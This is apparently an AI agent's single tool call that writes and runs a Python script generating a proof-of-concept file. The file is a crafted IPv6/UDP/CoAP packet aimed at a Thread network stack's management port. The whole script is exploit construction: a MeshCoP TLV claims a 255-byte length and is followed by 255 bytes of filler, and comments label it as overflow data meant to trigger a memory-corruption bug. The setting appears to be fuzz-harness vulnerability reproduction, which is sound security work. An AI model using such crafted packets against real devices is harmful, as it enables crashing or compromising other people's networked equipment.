Running command: cat > /workspace/gen_poc.py << 'EOF'
import struct

# Byte 0: settings (link security disabled)
settings = b'\x00'

# IPv6 header
version_tc_fl = 0x60000000  # Version=6, TC=0, FL=0

# CoAP message
coap_header = bytes([
    0x40,  # Version=1, Type=CON(0), Token Length=0
    0x02,  # Code = 0.02 (POST)
    0x00, 0x01,  # Message ID
])
# URI-Path option "c": option number 11, delta=11, length=1
uri_path_c = bytes([0xB1, 0x63])  # delta=11, len=1, "c"
# URI-Path option "cg": option number 11, delta=0, length=2
uri_path_cg = bytes([0x02, 0x63, 0x67])  # delta=0, len=2, "cg"
# Payload marker
payload_marker = bytes([0xFF])
# MeshCoP TLV: type=0x0D (kGet=13), length=0xFF (255)
meshcop_tlv = bytes([0x0D, 0xFF])
# 255 bytes of padding (the overflow data)
padding = bytes([0x41] * 255)

coap_msg = coap_header + uri_path_c + uri_path_cg + payload_marker + meshcop_tlv + padding
print(f"CoAP message length: {len(coap_msg)}")

# UDP header
src_port = 12345
dst_port = 61631  # kCoapUdpPort
udp_length = 8 + len(coap_msg)
udp_checksum = 0  # Will be skipped due to FUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION
udp_header = struct.pack('!HHHH', src_port, dst_port, udp_length, udp_checksum)

# IPv6 payload
ipv6_payload = udp_header + coap_msg
payload_length = len(ipv6_payload)
print(f"IPv6 payload length: {payload_length}")

# IPv6 header
next_header = 17  # UDP
hop_limit = 64

# Source: fdde:ad00:beef:0000::0001
src_addr = bytes.fromhex('fdde ad00 beef 0000 0000 0000 0000 0001'.replace(' ', ''))
# Destination: fdde:ad00:beef:0000:0000:00ff:fe00:fc00 (Leader ALOC)
dst_addr = bytes.fromhex('fdde ad00 beef 0000 0000 00ff fe00 fc00'.replace(' ', ''))

ipv6_header = struct.pack('!IHBB', version_tc_fl, payload_length, next_header, hop_limit) + src_addr + dst_addr
print(f"IPv6 header length: {len(ipv6_header)}")

# Full packet
packet = settings + ipv6_header + ipv6_payload
print(f"Total PoC size: {len(packet)}")

with open('/workspace/poc', 'wb') as f:
    f.write(packet)

print("PoC written to /workspace/poc")
EOF
python3 /workspace/gen_poc.py
